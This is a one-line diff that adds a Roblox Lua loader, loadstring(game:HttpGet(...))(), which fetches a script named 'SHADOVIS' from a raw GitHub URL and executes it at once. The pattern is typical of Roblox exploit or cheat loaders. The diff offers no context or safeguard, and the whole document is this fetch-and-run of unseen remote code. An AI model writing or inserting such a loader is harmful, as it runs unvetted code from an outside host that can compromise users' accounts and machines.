@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Novaz5792/Unknown/main/SHADOVIS"))()
